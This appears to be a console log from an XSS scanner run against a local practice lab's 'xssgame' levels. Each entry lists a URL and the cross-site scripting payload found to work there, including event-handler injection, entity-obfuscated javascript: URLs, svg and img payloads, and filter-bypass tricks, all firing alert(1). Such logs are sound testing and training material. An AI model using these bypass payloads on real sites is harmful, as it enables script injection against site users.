+[32m[2020-05-06 20:54:51,127] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:51,155] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level4.php?keyword=2[0m
+[32m[2020-05-06 20:54:51,177] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:51,243] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:51,296] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22oNcliCk%3D%22alert%281%29[0m
+[32m[2020-05-06 20:54:51,306] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:51,396] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level5.php?keyword=2[0m
+[32m[2020-05-06 20:54:53,483] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:53,515] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:53,518] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22j%26%23x61%3Bva%26%23x73%3Bc%26%23x72%3Bip%26%23x74%3B%3Aal%26%23x65%3B%26%23x72%3Bt%281%29[0m
+[32m[2020-05-06 20:54:53,521] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:53,548] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level6.php?keyword=2[0m
+[32m[2020-05-06 20:54:53,565] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:53,584] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:53,586] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22onclICk%3D%22alert%281%29[0m
+[32m[2020-05-06 20:54:53,588] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:53,657] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level7.php?keyword=2[0m
+[32m[2020-05-06 20:54:53,677] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:53,758] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:53,759] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-05-06 20:54:53,764] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:53,797] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-05-06 20:54:53,817] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:53,843] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:53,852] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level8.php?keyword=jav%26%23x61%3Bs%26%23x63%3B%26%23x72%3Bip%26%23x74%3B%3Aal%26%23x65%3Br%26%23x74%3B%26%23x28%3B1%29&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-05-06 20:54:53,854] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:53,911] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9.php?name=2 [0m
+[32m[2020-05-06 20:54:53,931] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:53,961] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:54,010] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//[0m
+[32m[2020-05-06 20:54:54,012] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:54,073] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9a.php?name=2[0m
+[32m[2020-05-06 20:54:54,093] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:54,144] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:54,145] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//[0m
+[32m[2020-05-06 20:54:54,147] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:54,213] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[36m[2020-05-06 20:54:54,234] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:54,240] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level10.php?name=2&t_sort=%22%3E%3Cimg%20sRc%3D1%20onERRor%3D%22alert%281%29[0m
+[32m[2020-05-06 20:54:54,244] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:54,261] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-05-06 20:54:54,280] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:54,301] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:54,303] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-05-06 20:55:27,461] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:27,489] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-05-06 20:55:27,512] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:27,543] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:27,545] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20oNLoad%3Dalert%281%29%3E&x=2[0m
+[32m[2020-05-06 20:55:27,547] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:27,556] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level2.php?keyword=2[0m
+[32m[2020-05-06 20:55:27,576] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:27,613] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:27,615] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level2.php?keyword=yy78pq%22OnclIck%3D%22alert%281%29[0m
+[32m[2020-05-06 20:55:27,616] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:27,636] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level3.php?keyword=2[0m
+[32m[2020-05-06 20:55:27,644] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:27,658] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:27,659] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level3.php?keyword=yy78pq%27OncLick%3D%27alert%281%29[0m
+[32m[2020-05-06 20:55:27,660] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:27,679] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level4.php?keyword=2[0m
+[32m[2020-05-06 20:55:27,708] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:27,756] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:27,758] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22oNclicK%3D%22alert%281%29[0m
+[32m[2020-05-06 20:55:27,760] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:27,769] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level5.php?keyword=2[0m
+[32m[2020-05-06 20:55:27,779] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:27,801] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:27,803] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22ja%26%23x76%3Bascr%26%23x69%3Bp%26%23x74%3B%3A%26%23x61%3B%26%23x6c%3B%26%23x65%3Brt%26%23x28%3B1%26%23x29%3B[0m
+[32m[2020-05-06 20:55:27,806] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:27,816] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level6.php?keyword=2[0m
+[32m[2020-05-06 20:55:27,828] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:27,845] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:27,847] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22oNclicK%3D%22alert%281%29[0m
+[32m[2020-05-06 20:55:27,849] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:27,879] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level7.php?keyword=2[0m
+[32m[2020-05-06 20:55:27,891] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:27,923] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:27,925] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onconclicklick%3D%22alert%281%29[0m
+[32m[2020-05-06 20:55:27,927] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:27,964] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-05-06 20:55:27,976] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:28,007] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:28,009] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level8.php?keyword=%26%23x6a%3Bav%26%23x61%3Bs%26%23x63%3Br%26%23x69%3Bpt%3A%26%23x61%3B%26%23x6c%3Be%26%23x72%3Bt%281%26%23x29%3B&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-05-06 20:55:28,012] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:28,041] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9.php?name=2 [0m
+[32m[2020-05-06 20:55:28,063] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:28,112] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:28,115] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//[0m
+[32m[2020-05-06 20:55:28,120] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:28,150] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9a.php?name=2[0m
+[32m[2020-05-06 20:55:28,185] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:28,229] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:28,231] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//[0m
+[32m[2020-05-06 20:55:28,234] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:28,245] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[36m[2020-05-06 20:55:28,285] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:28,287] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level10.php?name=2&t_sort=%22%3E%3Cimg%20sRc%3D1%20onERRor%3D%22alert%281%29[0m
+[32m[2020-05-06 20:55:28,290] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:55:28,298] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-05-06 20:55:28,319] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:55:28,339] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:55:28,341] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
